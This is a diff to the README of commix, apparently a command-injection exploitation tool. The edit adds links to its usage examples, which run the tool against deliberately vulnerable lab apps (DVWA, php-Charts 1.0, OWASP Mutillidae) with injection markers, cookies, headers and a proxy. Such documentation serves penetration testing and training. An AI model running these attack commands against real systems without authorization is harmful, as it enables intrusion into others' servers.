@@ -74,14 +74,14 @@ Download commix by cloning the Git repository:
     --base64            Use Base64 (enc)/(de)code trick to prevent false-
                         positive results.
 ####Usage Examples
-**Exploiting Damn Vulnerable Web App**
+**Exploiting [Damn Vulnerable Web App] (http://www.dvwa.co.uk/)**
 
     python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
     
-**Exploiting php-Charts 1.0 using injection payload suffix & prefix string:**
+**Exploiting [php-Charts 1.0] (http://www.exploit-db.com/exploits/25496/) using injection payload suffix & prefix string:**
 
     python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="//" --suffix="'" 
     
-**Exploiting OWASP Mutillidae using Extra headers and HTTP proxy:**
+**Exploiting [OWASP Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae) using Extra headers and HTTP proxy:**
 
     python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
